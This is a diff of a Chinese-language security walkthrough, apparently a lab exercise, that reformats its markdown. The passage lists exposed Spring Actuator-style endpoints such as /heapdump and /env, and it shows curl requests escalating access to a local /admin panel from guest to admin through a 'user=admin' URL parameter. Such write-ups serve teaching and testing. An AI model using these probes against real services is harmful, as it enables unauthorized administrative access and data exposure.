@@ -77,47 +77,36 @@ curl http://localhost:8085/actuator
 - /admin （管理面板）
 - /debug （调试信息）
 - /env （环境变量）
-- /heapdump （JVM 内存快照）
+- /heapdump （JVM 内存快照）<br />
+<br />
 
 4\. 权限绕过
 
-
-
 访问 /admin：
 
-
-
+```bash
 curl http://localhost:8085/admin
-
-
-
+```
 返回：
 
-
-
+```bash
 Admin Panel Access : guest
-
-
+```
 
 通过 URL 参数提升权限：
 
-
-
+```bash
 curl "http://localhost:8085/admin?user=admin"
-
-
+```
 
 返回：
 
-
-
+```bash
 Admin Panel Access : admin
+```
 
-
-
-说明管理接口 未授权访问，参数可控制角色。
-
-
+说明管理接口 未授权访问，参数可控制角色。<br />
+<br />
 
 5\. 信息泄露
 
